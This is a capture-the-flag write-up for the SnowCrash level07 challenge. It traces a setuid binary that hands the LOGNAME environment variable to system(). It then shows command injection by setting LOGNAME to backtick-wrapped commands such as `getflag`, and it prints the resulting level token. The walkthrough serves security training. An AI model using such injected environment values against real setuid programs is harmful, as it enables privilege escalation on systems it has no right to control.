[README.md](../README.md)
# level07

Upon logging in as level07, we find a file named `level07` in the home directory:
```sh
level07@SnowCrash:~$ file level07
level07: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x26457afa9b557139fa4fd3039236d1bf541611d0, not stripped
```

The presence of the setuid and setgid bits on an executable file can pose security risks as it enables the program to execute with elevated privileges.

```sh
level07@SnowCrash:~$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                                 = 2007
geteuid()                                                                 = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                       = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                       = 0
getenv("LOGNAME")                                                         = "level07"
asprintf(0xbffff744, 0x8048688, 0xbfffff49, 0xb7e5ee55, 0xb7fed280)       = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                    = 0
+++ exited (status 0) +++
```

We can manipulate the environment variable LOGNAME:
```sh
level07@SnowCrash:~$ export LOGNAME='Level08'
level07@SnowCrash:~$ ./level07
Level08
```

By utilizing backticks in the environment variable assignment, we can execute commands within the context of the program:
```sh
level07@SnowCrash:~$ export LOGNAME=\`ls\`
level07@SnowCrash:~$ ./level07
ls: cannot open directory .: Permission denied
```

Executing the getflag command:
```sh
level07@SnowCrash:~$ export LOGNAME=\`getflag\`
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

By employing the backtick character (`) in the environment variable assignment, we embed commands within the shell command executed by the program. This allows for command execution when the LOGNAME variable is referenced.